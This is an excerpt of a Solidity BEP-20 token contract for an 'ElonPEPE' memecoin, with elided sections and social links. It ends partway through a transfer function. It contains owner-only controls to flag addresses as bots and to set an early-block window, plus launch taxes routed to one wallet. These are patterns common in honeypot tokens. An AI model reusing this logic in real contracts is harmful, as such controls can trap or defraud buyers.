...
Initial LP:1BNB
HIGHTAX IN LAUNCH,
NORAMLA TAX：3/3 1LP 2MARKETING
Twitter：https://twitter.com/ElonPEPE
Official TG:https://t.me/ElonPEPEBSCATH
*/
...
contract ElonPEPE is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x84DB2FE78071eeE3DC264E7A99869e30D928049E); 
    address payable public teamWalletAddress = payable(0x84DB2FE78071eeE3DC264E7A99869e30D928049E); 
   ...
   uint256 public _airDropFee = 6;
    ...
    function setkb(uint256 kbblock) external onlyOwner {
        kb  = kbblock;
    }
    ...
    function setbot(address ad,bool NewValue) external onlyOwner() {
    isSwap[ad] = NewValue;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (block.number < ( startblock + kb) && sender == uniswapPair )
            {
